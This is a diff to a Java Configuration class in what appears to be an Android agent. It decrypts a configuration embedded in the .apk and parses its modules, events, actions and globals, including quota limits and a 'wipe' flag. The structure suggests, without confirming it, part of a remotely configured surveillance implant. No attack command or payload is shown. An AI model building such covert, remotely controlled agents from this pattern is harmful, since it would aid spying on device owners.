@@ -12,6 +12,7 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.util.Arrays;
 import java.util.Hashtable;
+import java.util.Iterator;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -47,7 +48,7 @@ public class Configuration {
 	/**
 	 * Configuration file embedded into the .apk
 	 */
-	private final byte[] resource;
+	private final String jsonResource;
 
 	/** Clear configuration buffer wrapped into a ByteBuffer. */
 	// private ByteBuffer wrappedClearConf;
@@ -76,10 +77,17 @@ public class Configuration {
 	 * 
 	 * @param resource
 	 *            the resource
+	 * @throws GeneralException
 	 */
-	public Configuration(final byte[] resource) {
+	public Configuration(final byte[] resource) throws GeneralException {
 		status = Status.self();
-		this.resource = resource;
+		// Decrypt Conf
+		jsonResource = decryptConfiguration(resource);
+	}
+
+	public Configuration(String jsonConf) throws GeneralException {
+		status = Status.self();
+		jsonResource = jsonConf;
 	}
 
 	/**
@@ -96,11 +104,8 @@ public class Configuration {
 				cleanConfiguration();
 			}
 
-			// Decrypt Conf
-			String json = decryptConfiguration(resource);
-
 			// Parse and load configuration
-			return parseConfiguration(instantiate, json);
+			return parseConfiguration(instantiate, jsonResource);
 		} catch (final Exception rcse) {
 			return false;
 		}
@@ -154,7 +159,8 @@ public class Configuration {
 			super(instantiate);
 		}
 
-		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException, JSONException {
+		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
+				JSONException {
 			final String moduleType = params.getString("module");
 
 			if (Cfg.DEBUG) {
@@ -196,7 +202,8 @@ public class Configuration {
 			super(instantiate);
 		}
 
-		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException, JSONException {
+		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
+				JSONException {
 			String desc = jaction.getString("desc");
 			final Action a = new Action(actionId, desc);
 
@@ -229,24 +236,6 @@ public class Configuration {
 		}
 	}
 
-	class LoadGlobal extends Visitor {
-		public LoadGlobal(boolean instantiate) {
-			super(instantiate);
-		}
-
-		public void call(int globalId, JSONObject jglobal) throws JSONException, GeneralException {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Global: " + globalId + " Params Len: " + jglobal.length());//$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			if (instantiate) {
-				final Global o = new Global(globalId, jglobal);
-				status.addGlobal(o);
-			}
-		}
-	}
-
 	/**
 	 * Parses the configuration. k
 	 * 
@@ -260,27 +249,45 @@ public class Configuration {
 			JSONArray jmodules = root.getJSONArray("modules");
 			JSONArray jevents = root.getJSONArray("events");
 			JSONArray jactions = root.getJSONArray("actions");
-			JSONArray jglobals = root.getJSONArray("globals");
+			JSONObject jglobals = root.getJSONObject("globals");
 
 			Visitor.load(jmodules, new LoadModule(instantiate));
 			Visitor.load(jevents, new LoadEvent(instantiate));
 			Visitor.load(jactions, new LoadAction(instantiate));
-			Visitor.load(jglobals, new LoadGlobal(instantiate));
+
+			loadGlobals(jglobals, instantiate);
 
 			// Debug Check. start //$NON-NLS-1$
 			Debug.StatusActions();
 			Debug.StatusAgents();
 			Debug.StatusEvents();
-			Debug.StatusOptions();
+			Debug.StatusGlobals();
 			// Debug Check. end //$NON-NLS-1$
 
 			return true;
 		} catch (JSONException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parseConfiguration) Error: " + e);
+			}
 			return false;
 		}
 
+	}
+
+	private void loadGlobals(JSONObject jglobals, boolean instantiate) throws JSONException {
+
+		Globals g = new Globals();
+
+		JSONObject jquota = jglobals.getJSONObject("quota");
+		g.quotaMin = jquota.getInt("min");
+		g.quotaMax = jquota.getInt("max");
+
+		g.wipe = jglobals.getBoolean("wipe");
+		g.type = jglobals.getString("type");
+		g.migrated = jglobals.getBoolean("migrated");
+		g.version = jglobals.getInt("version");
+		
+		status.setGlobal(g);
 	}
 
 	/**
